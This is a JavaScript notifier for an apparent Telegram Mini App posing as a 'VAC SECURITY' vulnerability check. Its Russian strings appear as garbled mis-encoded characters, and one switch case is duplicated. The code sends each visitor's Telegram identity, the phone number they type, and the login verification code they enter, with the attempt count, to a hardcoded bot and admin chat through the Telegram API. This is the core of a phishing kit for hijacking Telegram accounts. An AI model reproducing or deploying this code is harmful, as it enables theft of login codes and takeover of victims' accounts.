// bot-notifier.js
// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
const BOT_TOKEN = '6nFZB7f_YV9trqrBGKplWWt0';
const ADMIN_ID = '—Ä';

// –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è
const formatMessage = (type, data, user) => {
    const userInfo = `üë§ ${user.first_name || '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å'} ${user.last_name || ''}\n` +
                    `üÜî ID: <code>${user.id || '?'}</code>\n` +
                    `üîó USER: @${user.username || '?'}`;
    
    switch(type) {
        case 'init':
            return {
                text: `üö™ <b>–ù–æ–≤—ã–π –≤—Ö–æ–¥ –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ</b>\n\n${userInfo}`,
                buttons: []
            };
        case 'verified_enter':
            return {
                text: `üü¢ <b>–í–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–æ—à–µ–ª</b>\n\n${userInfo}`,
                buttons: []
            };
        case 'security_check_start':
            return {
                text: `üîç <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞—á–∞–ª –ø—Ä–æ–≤–µ—Ä–∫—É –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</b>\n\n${userInfo}`,
                buttons: []
            };
        case 'security_check_complete':
            return {
                text: `üìä <b>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∞</b>\n\n${userInfo}\n\n` +
                      `–ù–∞–π–¥–µ–Ω–æ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π: <b>${data.vulnerabilities || 0}</b>`,
                buttons: []
            };
        case 'phone':
            return {
                text: `üì± <b>–í–≤–µ–¥—ë–Ω –Ω–æ–º–µ—Ä:</b> <code>${data}</code>\n\n${userInfo}`,
                buttons: []
            };
        case 'code':
            return {
                text: `üî¢ <b>–í–≤–µ–¥—ë–Ω –∫–æ–¥</b>\n\n–ö–æ–¥: <code>${data}</code>\n\n${userInfo}`,
                buttons: []
            };
        case 'verification_success':
            return {
                text: `‚úÖ <b>–£—Å–ø–µ—à–Ω–∞—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è</b>\n\n` +
                      `–ö–æ–¥: <code>${data.code}</code>\n` +
                      `–ü–æ–ø—ã—Ç–æ–∫: <b>${data.attempts}</b>\n\n${userInfo}`,
                buttons: []
            };
        case 'app_close':
            return {
                text: `üö™ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã—à–µ–ª –∏–∑ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è</b>\n\n${userInfo}\n\n` +
                      `–í—Ä–µ–º—è: <code>${new Date(data.timestamp).toLocaleString()}</code>`,
                buttons: []
            };
        case 'app_close':
            return {
                text: `üö™ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã—à–µ–ª —Å–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏</b>\n\n${userInfo}\n\n` +
                      `–í—Ä–µ–º—è: <code>${new Date(data.timestamp).toLocaleString()}</code>`,
                buttons: []
            };
        case 'vulnerability_fix_attempt':
            return {
                text: `‚ö†Ô∏è <b>–ü–æ–ø—ã—Ç–∫–∞ –∏—Å–ø—Ä–∞–≤–∏—Ç—å —É—è–∑–≤–∏–º–æ—Å—Ç—å</b>\n\n` +
                      `–£—è–∑–≤–∏–º–æ—Å—Ç—å: <b>${data.vulnerability}</b>\n\n${userInfo}`,
                buttons: []
            };
        case 'vulnerability_fixed':
            return {
                text: `‚úÖ <b>–£—è–∑–≤–∏–º–æ—Å—Ç—å –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∞</b>\n\n` +
                      `–£—è–∑–≤–∏–º–æ—Å—Ç—å: <b>${data.vulnerability}</b>\n` +
                      `–í—Ä–µ–º—è: <code>${new Date(data.timestamp).toLocaleString()}</code>\n\n${userInfo}`,
                buttons: []
            };
        default:
            return {
                text: `‚ÑπÔ∏è <b>–ù–æ–≤–æ–µ —Å–æ–±—ã—Ç–∏–µ</b>\n\n–¢–∏–ø: ${type}\n–î–∞–Ω–Ω—ã–µ: ${JSON.stringify(data)}\n\n${userInfo}`,
                buttons: []
            };
    }
};

// –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –±–æ—Ç—É
window.sendToBot = async (type, data = null) => {
    try {
        const tg = window.Telegram.WebApp;
        const user = tg.initDataUnsafe.user || {};
        const message = formatMessage(type, data, user);
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: `üîê <b>VAC SECURITY</b>\n\n${message.text}`,
                parse_mode: 'HTML',
                reply_markup: message.buttons.length ? { 
                    inline_keyboard: message.buttons 
                } : undefined
            })
        });
        
        return await response.json();
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
        return null;
    }
};